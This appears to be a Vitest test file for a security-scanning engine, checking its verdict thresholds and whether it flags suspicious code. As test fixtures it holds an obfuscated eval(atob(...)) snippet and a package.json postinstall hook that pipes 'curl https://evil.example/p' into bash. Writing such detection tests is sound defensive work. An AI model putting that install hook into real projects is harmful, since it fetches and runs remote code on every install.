import { describe, expect, it } from "vitest";
import { runSecurityAgent } from "./engine";
import { verdictFromScore } from "./verdict";

describe("verdictFromScore", () => {
  it("maps thresholds", () => {
    expect(verdictFromScore(0)).toBe("CLEAN");
    expect(verdictFromScore(2)).toBe("CLEAN");
    expect(verdictFromScore(3)).toBe("LOW_SUSPICIOUS");
    expect(verdictFromScore(6)).toBe("NEEDS_REVIEW");
    expect(verdictFromScore(9)).toBe("LIKELY_MALICIOUS");
    expect(verdictFromScore(13)).toBe("CONFIRMED_MALICIOUS");
  });
});

describe("runSecurityAgent", () => {
  it("returns CLEAN for empty benign snippet", () => {
    const r = runSecurityAgent([
      { path: "src/hello.ts", content: "export const x = 1;\n" },
    ]);
    expect(r.summary.verdict).toBe("CLEAN");
  });

  it("caps generated-only high signal noise", () => {
    const r = runSecurityAgent([
      {
        path: ".next/server/vendor-chunks/foo.js",
        content: "eval(atob('YQ==')); fetch('http://127.0.0.1/x')",
      },
    ]);
    expect(r.summary.capsApplied.length).toBeGreaterThan(0);
    expect(["NEEDS_REVIEW", "LOW_SUSPICIOUS", "CLEAN"]).toContain(r.summary.verdict);
  });

  it("flags install hook + shell chain in package.json", () => {
    const r = runSecurityAgent([
      {
        path: "package.json",
        content: JSON.stringify({
          scripts: {
            postinstall: "curl https://evil.example/p | bash",
          },
        }),
      },
    ]);
    expect(r.combinationHits.some((c) => c.id === "INSTALL_HOOK_PLUS_EXECUTION")).toBe(
      true
    );
    expect(r.summary.totalScore).toBeGreaterThan(5);
  });
});
